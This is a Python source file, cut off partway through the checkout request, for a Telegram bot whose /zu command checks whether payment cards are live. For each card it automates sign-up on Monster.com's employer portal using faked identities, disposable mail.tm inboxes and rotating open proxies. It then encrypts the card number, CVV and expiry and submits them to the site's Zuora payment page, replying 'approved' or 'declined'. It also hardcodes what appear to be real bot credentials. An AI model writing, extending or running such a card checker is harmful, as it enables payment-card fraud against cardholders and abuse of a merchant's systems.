import os
import threading
import asyncio
import re
import random
import base64
import json
import time
from flask import Flask, jsonify
from pyrogram import Client, filters
from pyrogram.types import Message
from Crypto.Cipher import PKCS1_v1_5
from Crypto.PublicKey import RSA
from curl_cffi import requests as curl_requests
from faker import Faker
from secrets import token_bytes
from string import ascii_lowercase

# ======================= CONFIGURACIÓN =======================
API_ID = 27113333
API_HASH = "cfe0755384e418f8b0ed6b762843aa68"
BOT_TOKEN = "6912365083:AAEviaiGxRUF0RFHjmgkPK7YswqFCuTcHNI"

# ======================= PROXIES =======================
PROXY_LIST = [
    "http://43.153.54.58:3128",
    "http://137.66.1.45:80",
    "http://47.251.87.199:2002",
    "http://47.251.87.199:20125",
    "http://47.251.74.38:4840",
    "http://153.72.68.0:8081",
    "http://45.66.249.187:8080",
    "http://153.72.68.0:8080",
    "http://67.203.23.88:8081",
    "http://23.228.86.236:8081",
    "http://67.203.23.79:8081",
    "http://47.251.74.38:98",
    "http://45.66.249.187:8181",
    "http://47.251.87.199:1234",
    "http://174.138.162.35:8080",
]

# Proxies rápidos de FAST_full.txt
FAST_PROXIES = [
    "http://164.92.182.55:8080",
    "http://45.189.151.242:8080",
    "http://14.139.235.82:3128",
    "http://151.185.59.36:8080",
    "http://190.97.236.128:999",
    "http://97.74.87.226:80",
    "http://51.146.240.4:8080",
    "http://47.250.155.254:3129",
    "http://34.134.231.117:3129",
    "http://219.65.73.81:80",
    "http://39.102.210.176:8008",
    "http://51.254.132.238:80",
    "http://153.72.68.0:8081",
    "http://178.238.225.233:3128",
    "http://39.109.113.97:4090",
    "http://101.132.170.8:7890",
    "http://91.202.185.69:80",
    "http://37.59.125.131:8888",
    "http://141.98.153.86:80",
    "http://176.99.134.183:8090",
]

# ======================= FLASK APP =======================
app = Flask(__name__)

@app.route('/')
def home():
    return jsonify({"status": "running", "service": "Telegram Bot"})

@app.route('/health')
def health():
    return jsonify({"status": "healthy"})

# ======================= FUNCIÓN DEL BOT =======================
def start_bot():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    bot = Client("telegram_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

    # ======================= COMANDOS EXISTENTES =======================
    @bot.on_message(filters.command("start"))
    async def start_cmd(client, message):
        await message.reply_text(
            "👋 ¡Hola! Soy un bot de Telegram.\n\n"
            "📌 Comandos disponibles:\n"
            "  /start - Ver este mensaje\n"
            "  /ping - Verificar que el bot está vivo\n"
            "  /zu cc|mm|yy|cvv - Verificar tarjeta con Monster\n\n"
            "⚡ Desarrollado con Pyrogram"
        )

    @bot.on_message(filters.command("ping"))
    async def ping_cmd(client, message):
        await message.reply_text("🏓 Pong! Bot activo ✅")

    # ======================= COMANDO /zu =======================
    @bot.on_message(filters.command("zu"))
    async def zu_cmd(client, message):
        # Extraer el formato de la tarjeta
        text = message.text
        parts = text.split()
        
        if len(parts) < 2:
            await message.reply_text(
                "❌ Formato incorrecto.\n"
                "Usa: `/zu cc|mm|yy|cvv`\n\n"
                "Ejemplo: `/zu 4111111111111111|12|26|123`"
            )
            return
        
        card_data = parts[1]
        
        # Validar formato cc|mm|yy|cvv
        if '|' not in card_data:
            await message.reply_text(
                "❌ Formato incorrecto.\n"
                "Usa: `/zu cc|mm|yy|cvv`\n\n"
                "Ejemplo: `/zu 4111111111111111|12|26|123`"
            )
            return
        
        try:
            cc, mm, yy, cvv = card_data.split('|')
            cc = cc.strip()
            mm = mm.strip()
            yy = yy.strip()
            cvv = cvv.strip()
            
            # Validaciones básicas
            if not cc.isdigit() or len(cc) < 13:
                await message.reply_text("❌ Número de tarjeta inválido (debe tener al menos 13 dígitos)")
                return
            if not mm.isdigit() or int(mm) < 1 or int(mm) > 12:
                await message.reply_text("❌ Mes inválido (01-12)")
                return
            if not yy.isdigit() or len(yy) != 2:
                await message.reply_text("❌ Año inválido (formato YY)")
                return
            if not cvv.isdigit() or len(cvv) < 3:
                await message.reply_text("❌ CVV inválido (3-4 dígitos)")
                return
                
        except ValueError:
            await message.reply_text(
                "❌ Formato incorrecto.\n"
                "Usa: `/zu cc|mm|yy|cvv`\n\n"
                "Ejemplo: `/zu 4111111111111111|12|26|123`"
            )
            return

        # Enviar mensaje de "cargando"
        loading_msg = await message.reply_text("⏳ Procesando tarjeta...")

        try:
            # Ejecutar el checker en un hilo para no bloquear
            result = await asyncio.to_thread(run_zu_checker, cc, mm, yy, cvv)
            
            # Actualizar el mensaje con el resultado
            if result.get("status") and result.get("succes"):
                await loading_msg.edit_text(
                    f"✅ **APROBADA**\n\n"
                    f"💳 Tarjeta: `{cc[:4]}****{cc[-4:]}`\n"
                    f"📅 Expira: {mm}/{yy}\n"
                    f"🔐 CVV: `***`\n\n"
                    f"📝 Respuesta: {result.get('gateway-response', 'Approved')}\n"
                    f"🏷️ Gateway: {result.get('gateway-type', 'Zuora')}\n"
                    f"💰 Monto: ${result.get('gateway-amount', '0.00')}\n"
                    f"🌐 Moneda: {result.get('gateway-currency', 'USD')}"
                )
            else:
                await loading_msg.edit_text(
                    f"❌ **DECLINADA**\n\n"
                    f"💳 Tarjeta: `{cc[:4]}****{cc[-4:]}`\n"
                    f"📅 Expira: {mm}/{yy}\n"
                    f"🔐 CVV: `***`\n\n"
                    f"📝 Respuesta: {result.get('gateway-response', 'Declined')}\n"
                    f"🏷️ Gateway: {result.get('gateway-type', 'Zuora')}"
                )
                
        except Exception as e:
            await loading_msg.edit_text(f"❌ Error al procesar: {str(e)[:100]}")

    # ======================= MANEJADOR DE ERRORES =======================
    @bot.on_message()
    async def fallback(client, message):
        await message.reply_text(
            "❌ Comando no reconocido.\n"
            "Usa /help para ver los comandos disponibles."
        )

    print("🤖 Bot iniciado correctamente.")
    bot.start()
    loop.run_forever()
    bot.stop()

# ======================= CHECKER DE MONSTER =======================
class GatewaysDeveloper:
    _MaxRetrys = 3

    def __init__(self):
        self._MailTMCredentials = {}

    def _Capture(self, text, start, end):
        try:
            s = text.index(start) + len(start)
            return text[s:text.index(end, s)]
        except:
            return None

    def _GenerateRandomData(self):
        fake = Faker("en_US")
        return (
            fake.street_address(),
            fake.city(),
            fake.state(),
            fake.state_abbr(),
            fake.zipcode(),
            fake.numerify("##########"),
            fake.user_name(),
            fake.email(),
            "PijaDura!760",
            fake.first_name(),
            fake.last_name()
        )

    def _GetProxy(self, _ProxyService="Apify", _Country="US"):
        # Usar proxies rápidos
        return random.choice(FAST_PROXIES + PROXY_LIST)

    def _CreateSessionWeb(self, _ServiceWeb="Curlcffi", _ProxyWeb=None):
        s = curl_requests.Session(impersonate="firefox135")
        if _ProxyWeb:
            s.proxies = {"http": _ProxyWeb, "https": _ProxyWeb}
        return s

    def _CreateTempEmail(self, _Provider="MailTM"):
        s = curl_requests.Session()
        req = s.get("https://api.mail.tm/domains")
        domain = json.loads(req.text)["hydra:member"][0]["domain"]
        username = "".join(random.choices(ascii_lowercase, k=10))
        email = f"{username}@{domain}"
        s.post("https://api.mail.tm/accounts", json={"address": email, "password": "PijaDura!760"})
        req = s.post("https://api.mail.tm/token", json={"address": email, "password": "PijaDura!760"})
        token = json.loads(req.text).get("token", "")
        self._MailTMCredentials[email] = token
        return email

    def _FetchMailBody(self, _Provider="MailTM", _MessageNumber=0, _Email=""):
        s = curl_requests.Session()
        token = self._MailTMCredentials.get(_Email, "")
        if not token:
            return None
        for _ in range(10):
            req = s.get("https://api.mail.tm/messages", headers={"Authorization": f"Bearer {token}"})
            messages = json.loads(req.text).get("hydra:member", [])
            if len(messages) > _MessageNumber:
                msg_id = messages[_MessageNumber]["id"]
                req = s.get(f"https://api.mail.tm/messages/{msg_id}", headers={"Authorization": f"Bearer {token}"})
                data = json.loads(req.text)
                text = data.get("text", "") or ""
                if text:
                    return text
                html = data.get("html", [])
                return html[0] if html else ""
            time.sleep(3)
        return None

    def _Encrypt(self, _EncryptService="asd", _EncryptType="Zuora", _Card="", _Mm="", _Yy="", _Cvv="", _FieldKey=""):
        if _EncryptType == "Zuora":
            Prefix = ".".join(str(random.randrange(256)) for _ in range(4))
            Payload = f"#{Prefix}#{_Card}#{_Cvv}#{_Mm}#{_Yy}"
            Encoded = base64.b64encode(Payload.encode())
            FieldKey = _FieldKey.strip()
            if "BEGIN PUBLIC KEY" not in FieldKey:
                FieldKey = f"-----BEGIN PUBLIC KEY-----\n{FieldKey}\n-----END PUBLIC KEY-----"
            Cipher = PKCS1_v1_5.new(RSA.import_key(FieldKey))
            return base64.b64encode(Cipher.encrypt(Encoded)).decode()
        return ""

    def _VerifyStatusResponse(self, message):
        _live = ["Transaction declined.2010 - Card Issuer Declined CVV", "Approved"]
        return any(k.lower() in message.lower() for k in _live)

    def Run(self, _card, _mm, _yy, _cvv):
        message, status = self._Execute(_card, _mm, _yy, _cvv)
        return {
            "status": True,
            "succes": bool(status),
            "gateway-response": message,
            "api-response": "Approved! ✅" if status else "Declined ❌",
            "gateway-type": "Zuora + Braintree",
            "gateway-mode": "auth",
            "gateway-amount": 0.00,
            "gateway-currency": "USD"
        }

    def _Execute(self, _card, _mm, _yy, _cvv):
        GatewaysErrorStatus = False
        SiteError = "Error desconocido"
        
        for _ in range(self._MaxRetrys):
            address, city, state, statecode, zipcode, phone, username, email, password, name1, name2 = self._GenerateRandomData()
            proxy = self._GetProxy(_ProxyService="Apify", _Country="US")
            web = self._CreateSessionWeb(_ServiceWeb="Curlcffi", _ProxyWeb=proxy)

            # ===== PASO 1: Obtener Authorize URL =====
            headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "keep-alive", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:151.0) Gecko/20100101 Firefox/151.0"}
            try:
                req = web.get("https://manage.monster.com/auth/login?r=%2Fdashboard&keepSessionInfo=true&apigeeApiKey=4u8nirp5l6ugasm1im1itrg0er&employerEnvironment=prod-ams&employerLocale=en-US&employerHost=https%3A%2F%2Fmanage.monster.com&employerBffDomain=https%3A%2F%2Fappsapi.monster.io%2Femployer-bff%2Fv1", headers=headers, allow_redirects=False)
                AuthorizeUrl = req.headers.get("location", req.headers.get("Location", ""))
                if not AuthorizeUrl:
                    SiteError = "Failed Getting Authorize URL (Request 1)"
                    continue
            except Exception as u:
                SiteError = f"Failed Getting Authorize URL (Request 1) | {u}"
                continue

            # ===== PASO 2: Obtener Auth0 Config =====
            headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "keep-alive", "Referer": "https://manage.monster.com/", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:151.0) Gecko/20100101 Firefox/151.0"}
            try:
                req = web.get(AuthorizeUrl, headers=headers)
                UlpUrl = req.url
                B64Match = re.search(r'window\.atob\(["\']([A-Za-z0-9+/=]+)["\']\)', req.text)
                if not B64Match:
                    SiteError = "Failed Getting Auth0 Config (Request 2)"
                    continue
                Config = json.loads(base64.b64decode(B64Match.group(1) + "==").decode("utf-8", "replace"))
                ClientId = Config["clientID"]
                AuthState1 = Config["extraParams"]["state"]
                Nonce1 = Config["extraParams"]["nonce"]
                Csrf1 = Config["extraParams"]["_csrf"]
                Auth0ClientH = base64.b64encode(b'{"name":"auth0.js","version":"9.15.0"}').decode()
                if not ClientId or not AuthState1 or not Nonce1 or not Csrf1:
                    SiteError = "Failed Getting Auth0 Config values (Request 2)"
                    continue
            except Exception as u:
                SiteError = f"Failed Getting Auth0 Config (Request 2) | {u}"
                continue

            # ===== PASO 3: Signup =====
            TempMail = self._CreateTempEmail(_Provider="MailTM")
            headers = {"Accept": "*/*", "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7", "Auth0-Client": Auth0ClientH, "Connection": "keep-alive", "Content-Type": "application/json", "Host": "hiring-identity.monster.com", "Origin": "https://hiring-identity.monster.com", "Referer": UlpUrl, "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:151.0) Gecko/20100101 Firefox/151.0"}
            json_data = {"client_id": ClientId, "state": AuthState1, "connection": "Username-Password-Authentication", "email": TempMail, "password": "PijaDura!760", "user_metadata": {"tier": "free", "emailNotifications": "true", "language": "en-US", "domain": "https://manage.monster.com/"}}
            try:
                req = web.post("https://hiring-identity.monster.com/dbconnections/signup", headers=headers, json=json_data)
                if "_id" not in req.text:
                    SiteError = "Failed Signup (Request 3)"
                    continue
            except Exception as u:
                SiteError = f"Failed Signup (Request 3) | {u}"
                continue

            # ===== PASO 4-5: Obtener OTP y verificar =====
            try:
                MessageOtp = self._FetchMailBody(_Provider="MailTM", _MessageNumber=0, _Email=TempMail)
                CodeOtp = self._Capture(MessageOtp, "                       ( ", " )")
                if not CodeOtp:
                    SiteError = "Error Getting OTP From MailTM"
                    continue
            except Exception as u:
                SiteError = f"Error Getting OTP From MailTM | {u}"
                continue

            headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "keep-alive", "Host": "u55288587.ct.sendgrid.net", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:151.0) Gecko/20100101 Firefox/151.0"}
            try:
                req = web.get(CodeOtp, headers=headers)
                CodeOtp = self._Capture(req.url, 'email-verification?ticket=', '#')
                if not CodeOtp:
                    SiteError = "Failed Getting Ticket Verification Email (Request 4)"
                    continue
            except Exception as u:
                SiteError = f"Failed Getting Ticket Verification Email (Request 4) | {u}"
                continue

            headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "keep-alive", "Host": "hiring-identity.monster.com", "Referer": "https://manage.monster.com/", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:151.0) Gecko/20100101 Firefox/151.0"}
            try:
                req = web.get(f"https://hiring-identity.monster.com/u/email-verification?ticket={CodeOtp}", headers=headers)
                StateVerifyMail = self._Capture(req.text, 'name="state" value="', '"')
                if not StateVerifyMail:
                    SiteError = "Failed Getting Verify Page State (Request 4)"
                    continue
            except Exception as u:
                SiteError = f"Failed Getting Verify Page (Request 4) | {u}"
                continue

            headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "keep-alive", "Content-Type": "application/x-www-form-urlencoded", "Host": "hiring-identity.monster.com", "Origin": "https://hiring-identity.monster.com", "Referer": f"https://hiring-identity.monster.com/u/email-verification?ticket={CodeOtp}", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:151.0) Gecko/20100101 Firefox/151.0"}
            data = {"state": StateVerifyMail}
            try:
                req = web.post(f"https://hiring-identity.monster.com/u/email-verification?ticket={CodeOtp}", headers=headers, data=data)
                if "verified" not in req.url.lower() and "Your+email" not in req.url and "success" not in req.url.lower():
                    SiteError = "Failed Verify Email (Request 5)"
                    continue
            except Exception as u:
                SiteError = f"Failed Verify Email (Request 5) | {u}"
                continue

            # ===== PASO 6-7: Fresh Authorize =====
            headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "keep-alive", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:151.0) Gecko/20100101 Firefox/151.0"}
            try:
                req = web.get("https://manage.monster.com/auth/login?r=%2Fdashboard&keepSessionInfo=true&apigeeApiKey=4u8nirp5l6ugasm1im1itrg0er&employerEnvironment=prod-ams&employerLocale=en-US&employerHost=https%3A%2F%2Fmanage.monster.com&employerBffDomain=https%3A%2F%2Fappsapi.monster.io%2Femployer-bff%2Fv1", headers=headers, allow_redirects=False)
                AuthorizeUrl2 = req.headers.get("location", req.headers.get("Location", ""))
                if not AuthorizeUrl2:
                    SiteError = "Failed Getting Fresh Authorize URL (Request 6)"
                    continue
            except Exception as u:
                SiteError = f"Failed Getting Fresh Authorize URL (Request 6) | {u}"
                continue

            headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "keep-alive", "Referer": "https://manage.monster.com/", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:151.0) Gecko/20100101 Firefox/151.0"}
            try:
                req = web.get(AuthorizeUrl2, headers=headers)
                UlpUrl2 = req.url
                B64Match2 = re.search(r'window\.atob\(["\']([A-Za-z0-9+/=]+)["\']\)', req.text)
                if not B64Match2:
                    SiteError = "Failed Getting Fresh Auth0 Config (Request 7)"
                    continue
                Config2 = json.loads(base64.b64decode(B64Match2.group(1) + "==").decode("utf-8", "replace"))
                AuthState2 = Config2["extraParams"]["state"]
                Nonce2 = Config2["extraParams"]["nonce"]
                Csrf2 = Config2["extraParams"]["_csrf"]
                if not AuthState2 or not Nonce2 or not Csrf2:
                    SiteError = "Failed Getting Fresh Auth0 Config values (Request 7)"
                    continue
            except Exception as u:
                SiteError = f"Failed Getting Fresh Auth0 Config (Request 7) | {u}"
                continue

            # ===== PASO 8: Auth0 Login =====
            headers = {"Accept": "*/*", "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7", "Auth0-Client": Auth0ClientH, "Connection": "keep-alive", "Content-Type": "application/json", "Host": "hiring-identity.monster.com", "Origin": "https://hiring-identity.monster.com", "Referer": UlpUrl2, "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:151.0) Gecko/20100101 Firefox/151.0"}
            json_data = {"client_id": ClientId, "redirect_uri": "https://manage.monster.com/auth/callback", "tenant": "monster-employer-prod", "response_type": "code", "scope": "openid email profile offline_access", "audience": "employer-bff-api-gateway", "state": AuthState2, "_csrf": Csrf2, "_intstate": "deprecated", "nonce": Nonce2, "username": TempMail, "password": "PijaDura!760", "connection": "Username-Password-Authentication"}
            try:
                req = web.post("https://hiring-identity.monster.com/usernamepassword/login", headers=headers, json=json_data)
                FormAction = self._Capture(req.text, 'action="', '"')
                WaVal = self._Capture(req.text, 'name="wa" value="', '"')
                WresultMatch = re.search(r'name="wresult"[^>]*\s+value="([^"]+)"', req.text, re.DOTALL) or re.search(r'name="wresult"\s+value="([^"]+)"', req.text, re.DOTALL)
                WctxMatch = re.search(r'name="wctx"[^>]*\s+value="([^"]+)"', req.text, re.DOTALL) or re.search(r'name="wctx"\s+value="([^"]+)"', req.text, re.DOTALL)
                WresultRaw = WresultMatch.group(1) if WresultMatch else None
                WctxRaw = WctxMatch.group(1) if WctxMatch else None
                if not FormAction or not WaVal or not WresultRaw:
                    SiteError = "Failed Auth0 Login (Request 8)"
                    continue
            except Exception as u:
                SiteError = f"Failed Auth0 Login (Request 8) | {u}"
                continue

            # ===== PASO 9: Auth0 Callback =====
            headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "keep-alive", "Content-Type": "application/x-www-form-urlencoded", "Host": "hiring-identity.monster.com", "Origin": "https://hiring-identity.monster.com", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:151.0) Gecko/20100101 Firefox/151.0"}
            headers2 = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "keep-alive", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:151.0) Gecko/20100101 Firefox/151.0"}
            try:
                Wresult = WresultRaw.replace("&#34;", '"').replace("&amp;", "&").replace("&lt;", "<").replace("&gt;", ">")
                Wctx = (WctxRaw or "").replace("&#34;", '"').replace("&amp;", "&")
                data = {"wa": WaVal, "wresult": Wresult, "wctx": Wctx}
                web.post(FormAction, headers=headers, data=data)
                req = web.get("https://manage.monster.com/en-us/accountCreation", headers=headers2)
                Bearer = self._Capture(req.text, '"accessToken":"', '"')
                DeviceId = self._Capture(req.text, '"device_id":"', '"') or ""
                if not Bearer:
                    SiteError = "Failed Getting Bearer (Request 9)"
                    continue
            except Exception as u:
                SiteError = f"Failed Auth0 Callback (Request 9) | {u}"
                continue

            # ===== PASO 10: Create Account =====
            headers = {"Accept": "*/*", "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7", "authorization": f"Bearer {Bearer}", "Connection": "keep-alive", "Content-Type": "application/json", "Host": "appsapi.monster.io", "Origin": "https://manage.monster.com", "Referer": "https://manage.monster.com/", "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:151.0) Gecko/20100101 Firefox/151.0", "x-employer-locale": "en-US", "x-employer-origin": "https://manage.monster.com", "x-employer-tracking-device-id": DeviceId}
            json_data = {"operationName": "CreateAccount", "query": "mutation CreateAccount($accountInput: AccountInput!) {\n  createAccount(accountInput: $accountInput) {\n    accountId\n    companyName\n    customerWebsite\n    __typename\n  }\n}\n", "variables": {"accountInput": {"accountName": "PINGADURA INC", "contactFirstName": name1, "contactLastName": name2, "email": TempMail, "phone": "9898989898", "country": "US", "signUpDomain": ".com", "customerWebsite": "", "subPremise": "", "addressLocality": "Boston", "addressRegion": "MA", "postalCode": "02108", "streetAddress": "Acorn Street"}}}
            try:
                req = web.post("https://appsapi.monster.io/employer-bff/v1/graphql?apiKey=4u8nirp5l6ugasm1im1itrg0er", headers=headers, json=json_data)
                AccountId = self._Capture(req.text, '"accountId":"', '"')
                if not AccountId:
                    SiteError = "Failed Creating Account (Request 10)"
                    continue
            except Exception as u:
                SiteError = f"Failed Creating Account (Request 10) | {u}"
                continue

            # ===== PASO 11: Get Token Account Id =====
            headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "keep-alive", "Host": "manage.monster.com", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:151.0) Gecko/20100101 Firefox/151.0"}
            try:
                req = web.get("https://manage.monster.com/en-us/membershipPayment?planId=8a128c1b888ec3c0018891010c3c0459", headers=headers)
                AccountId = self._Capture(req.text, '"AccountBillingInfo","accountId":"', '"')
                Bearer = self._Capture(req.text, '"accessToken":"', '"')
                DeviceId = self._Capture(req.text, '"device_id":"', '"') or DeviceId
                if not AccountId or not Bearer:
                    SiteError = "Failed Getting Token Account Id (Request 11)"
                    continue
            except Exception as u:
                SiteError = f"Failed Getting Token Account Id (Request 11) | {u}"
                continue

            # ===== PASO 12: Get Payment Page Info =====
            headers = {"Accept": "*/*", "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7", "authorization": f"Bearer {Bearer}", "Connection": "keep-alive", "Content-Type": "application/json", "Host": "appsapi.monster.io", "Origin": "https://manage.monster.com", "Referer": "https://manage.monster.com/", "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:151.0) Gecko/20100101 Firefox/151.0", "x-employer-account-id": AccountId, "x-employer-locale": "en-US", "x-employer-origin": "https://manage.monster.com", "x-employer-tracking-device-id": DeviceId}
            json_data = {"operationName": "GetPaymentPageInfo", "query": "query GetPaymentPageInfo($paymentInfoInput: PaymentInfoInput!) {\n  paymentInfo(paymentInfoInput: $paymentInfoInput) {\n    apiUrl\n    billingAccountId\n    paymentPageId\n    signature\n    token\n    publicKey\n    tenantId\n    __typename\n  }\n}\n", "variables": {"paymentInfoInput": {"accountId": AccountId, "paymentMethod": "credit_card"}}}
            try:
                req = web.post("https://appsapi.monster.io/employer-bff/v1/graphql?apiKey=4u8nirp5l6ugasm1im1itrg0er", headers=headers, json=json_data)
                ZuoraId = self._Capture(req.text, 'paymentPageId":"', '"')
                ZuoraTenantId = self._Capture(req.text, 'tenantId":"', '"')
                ZuoraToken = self._Capture(req.text, 'token":"', '"')
                ZuoraFieldAccountId = self._Capture(req.text, 'billingAccountId":"', '"')
                ZuoraSignature = self._Capture(req.text, 'signature":"', '"')
                if not ZuoraId or not ZuoraTenantId or not ZuoraToken or not ZuoraFieldAccountId or not ZuoraSignature:
                    SiteError = "Failed Getting Tokens Zuora Iframe (Request 12)"
                    continue
            except Exception as u:
                SiteError = f"Failed Getting Tokens Zuora Iframe (Request 12) | {u}"
                continue

            # ===== PASO 13: Get Zuora Iframe Tokens =====
            headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "keep-alive", "Host": "www.zuora.com", "Referer": "https://manage.monster.com/", "Sec-Fetch-Storage-Access": "none", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:151.0) Gecko/20100101 Firefox/151.0"}
            params = {"method": "requestPage", "host": "https://manage.monster.com/en-us/membershipPayment?planId=8a128c1b888ec3c0018891010c3c0459", "fromHostedPage": "true", "id": ZuoraId, "tenantId": ZuoraTenantId, "locale": "en_US", "token": ZuoraToken, "paymentGateway": "", "style": "inline", "submitEnabled": "false", "field_accountId": ZuoraFieldAccountId, "countryBlackList": "AFG,ALB,BLR,BIH,CAF,CHN,CUB,PRK,COD,EGY,ERI,GNB,HTI,IRN,IRQ,XKX,LBN,LBY,MDA,MNE,MMR,GIN,MKD,RUS,SRB,SOM,SSD,SDN,SYR,TUN,UKR,VEN,YEM,ZWE,ARG,AZE,BRA,CHL,COL,DOM,ECU,ETH,GEO,IDN,KAZ,KEN,NGA,VNM", "field_passthrough1": AccountId, "signature": ZuoraSignature, "retainValues": "true", "zlog_level": "warn"}
            try:
                req = web.get("https://www.zuora.com/apps/PublicHostedPageLite.do", headers=headers, params=params)
                ZuoraId = self._Capture(req.text, 'name="id" id="id" value="', '"')
                ZuoraTenantId = self._Capture(req.text, 'name="tenantId" id="tenantId" value="', '"')
                ZuoraToken = self._Capture(req.text, 'name="token" id="token" value="', '"')
                ZuoraSignature = self._Capture(req.text, 'name="signature" id="signature" value="', '"')
                ZuoraFieldKey = self._Capture(req.text, 'name="field_key" value="', '"')
                Zuoraxjd28s_6sk = self._Capture(req.text, 'name="xjd28s_6sk" id="xjd28s_6sk" value="', '"')
                if not ZuoraId or not ZuoraTenantId or not ZuoraToken or not ZuoraSignature or not ZuoraFieldKey or not Zuoraxjd28s_6sk:
                    SiteError = "Failed Getting Zuora Iframe Tokens (Request 13)"
                    continue
            except Exception as u:
                SiteError = f"Failed Getting Zuora Iframe Tokens (Request 13) | {u}"
                continue

            # ===== PASO 14: Post Checkout =====
            EncryptCard = self._Encrypt(_EncryptService="asd", _EncryptType="Zuora", _Card=_card, _Mm=_mm, _Yy=_yy, _Cvv=_cvv, _FieldKey=ZuoraFieldKey)
            headers = {"Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "keep-alive", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Host": "www.zuora.com", "Origin": "https://www.zuora.com", "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:151.0) Gecko/20100101 Firefox/151.0", "X-Requested-With": "XMLHttpRequest"}
            data = {"method": "submitPage", "id": ZuoraId, "tenantId": ZuoraTenantId, "token": ZuoraToken, "signature": ZuoraSignature, "paymentGateway": "", "field_authorizationAmount": "", "field_screeningAmount": "", "field_currency": "", "field_key": ZuoraFieldKey, "locale": "en_US", "field_style": "inline", "jsVersion": "", "field_submitEnabled": "false", "field_callbackFunctionEnabled": "", "field_signatureType": "", "host": "https://manage.monster.com/en-us/membershipPayment?planId=8a128c1b888ec3c0018891010c3c0459", "encrypted_fields": "#field_ipAddress#field_creditCardNumber#field_cardSecurityCode#field_creditCardExpirationMonth#field_creditCardExpirationYear", "encrypted_values": EncryptCard, "customizeErrorRequired": "", "fromHostedPage": "true", "isGScriptLoaded": "false", "is3DSEnabled": "", "checkDuplicated": "", "captchaRequired": "", "captchaSiteKey": "", "field_mitConsentAgreementSrc": "", "field_mitConsentAgreementRef": "", "field_mitCredentialProfileType": "", "field_agreementSupportedBrands": "", "paymentGatewayType": "", "paymentGatewayVersion": "", "is3DS2Enabled": "", "cardMandateEnabled": "", "zThreeDs2TxId": "", "threeDs2token": "", "threeDs2Sig": "", "threeDs2Ts": "", "threeDs2OnStep": "", "threeDs2GwData": "", "doPayment": "", "storePaymentMethod": "", "documents": "", "xjd28s_6sk": Zuoraxjd28s_6sk, "pmId": "", "button_outside_force_redirect": "false", "browserScreenHeight": "1026", "browserScreenWidth": "1824", "field_passthrough1": AccountId, "field_passthrough2": "", "field_passthrough3": "", "field_passthrough4": "", "field_passthrough5": "", "field_passthrough6": "", "field_passthrough7": "", "field_passthrough8": "", "field_passthrough9": "", "field_passthrough10": "", "field_passthrough11": "", "field_passthrough12": "", "field_passthrough13": "", "field_passthrough14": "", "field_passthrough15": "", "field_accountId": ZuoraFieldAccountId, "field_gatewayName": "", 